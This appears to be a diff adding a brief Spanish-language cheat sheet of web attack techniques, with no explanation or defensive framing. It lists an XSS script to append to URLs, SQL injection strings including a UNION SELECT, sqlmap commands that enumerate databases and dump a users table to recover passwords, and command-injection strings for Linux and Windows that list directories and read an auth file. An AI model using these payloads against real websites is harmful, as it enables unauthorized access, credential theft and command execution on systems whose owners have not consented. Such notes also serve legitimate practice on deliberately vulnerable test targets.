@@ -1,0 +1,19 @@
+
+XSS
+  al final de la url... <script>alert(”hola”);</script>
+
+SQLi
+  al final de la url... and (select 1 from vicente)=1* | ******************************UNION SELECT ALL 1,2,3,4,5,6,7,8,9...
+  en terminal...
+    # sqlmap -u “*link vulnerable*” --dbs
+  Cuando ya sabemos el **nombre** de la base de datos
+    # sqlmap -u “*link vulnerable*” -D **acuart** --tables
+  Buscar contraseña de la **tabla usuarios**
+    # sqlmap -u “*link vulnerable*” -D acuart -T **users** --dump
+
+Inyección de comandos
+  Si es linux..
+    # | ls / & ls
+  Si es windows 
+    # ‘ & dir &’
+    # ‘ & type auth. &’
